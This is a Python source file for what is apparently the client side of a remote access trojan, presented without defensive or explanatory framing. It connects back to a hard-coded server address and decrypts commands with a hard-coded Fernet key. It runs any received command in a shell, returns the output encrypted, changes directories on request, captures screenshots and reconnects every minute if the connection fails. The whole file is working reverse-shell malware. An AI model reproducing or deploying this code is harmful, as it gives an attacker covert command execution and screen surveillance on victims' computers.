import socket
import subprocess
import os
import sys
import time
from cryptography.fernet import Fernet
from PIL import ImageGrab
import struct
import pickle


'stores key here'
def get_key():
    key = b'pFU-GlitYrfsz6WevLup7doR7wJa8gYA7kj7WDM9ONQ='
    return key


# Encrypt message:
# - read key and encrypt
def encrypt_mess(comm):
    'encode message'
    key = get_key()
    'use key to encrypt'
    f = Fernet(key)
    encrypted = f.encrypt(comm)
    print(encrypted)
    return encrypted


# Decrypt data
def decrypt_mess(message):
    key = get_key()
    f = Fernet(key)
    decrypted_mess = f.decrypt(message)
    return decrypted_mess

# send images as data
def send_data(conn, data):
    serialized_data = pickle.dumps(data)
    conn.sendall(struct.pack('>I', len(serialized_data)))
    conn.sendall(serialized_data)

def run_command(command):
    # print(message)
    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = proc.stdout.read() + proc.stderr.read()
    return output

def main():
    try:
      'initialise socket'
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      print("[+] Client on...")

      '#### server address ####'
      ip = '192.168.1.6'
      port = 8888

      #remain listening
      'connect socket'
      s.connect((ip, port))
      print("[+] Connected to server..")

      while True:
          try:
              data = s.recv(4096)
              print(data)
              #decrypt data
              decrypt = decrypt_mess(data)
              message = decrypt.decode()
              print("message: " + message)
              if "cd" in message:
                  newDir = message.replace('cd ', '')
                  try:
                    os.chdir(newDir)
                  except:
                      newDir = "Bad Input!"
                  print("here: " + newDir)
                  dest = newDir.encode()
                  encrypted = encrypt_mess(dest)
                  s.send(encrypted)
              elif message == "screen_grab":
                  im = ImageGrab.grab()
                  filename = "test"
                  send_data(s, im)
                  'continue to send bytes up to that size'
              elif data == '':
                  print("server disconnected")
                  s.close()
                  sys.exit()
                  #run back to listen mode
              else:
                  #print(message)
                  output = run_command(message)
                  print(output)
                  #print(output)
                  enc_out = encrypt_mess(output)
                  s.send(enc_out)
          except:
              message = "bad input"
              enc_mess = encrypt_mess(message)
              s.send(enc_mess)
    except:
          print('unable to make connection. Will try again in 1 minutes.')
          time.sleep(60)
          main()



main()